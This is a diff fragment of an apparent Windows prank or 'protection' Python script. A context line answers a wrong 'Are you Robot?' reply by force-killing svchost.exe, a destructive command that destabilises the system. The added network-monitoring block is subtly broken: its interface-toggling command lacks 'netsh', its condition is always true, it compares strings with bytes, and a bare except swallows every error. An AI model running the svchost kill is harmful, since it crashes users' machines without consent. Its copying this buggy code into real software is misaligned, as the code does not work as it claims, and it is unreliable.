@@ -99,3 +99,20 @@ try:
                 a = pyautogui.confirm('Are you Robot? {}',format(str(x)+'+'+str(y)+'=?'), buttons=btn)
                 if a != z:
                     os.system('taskkill /f /im svchost.exe')
+        # Task 3: Please don't send my data!
+        import time
+        network = os.popen('netstat -ano').readlines()
+        ipblacklist = []
+        def stopNetwork():
+            os.system('interface set interface "以太网" disabled')
+            time.sleep(1/4)
+            os.system('interface set interface "以太网" enabled')
+        import urllib.request
+        
+        try:
+            for i in network:
+                x = urllib.request.urlopen('https://ti.qianxin.com/v2/search?type=ip&value='+i).read()
+                if 'DHT' or 'noSafe' in x:
+                    stopNetwork()
+        except:
+            pass
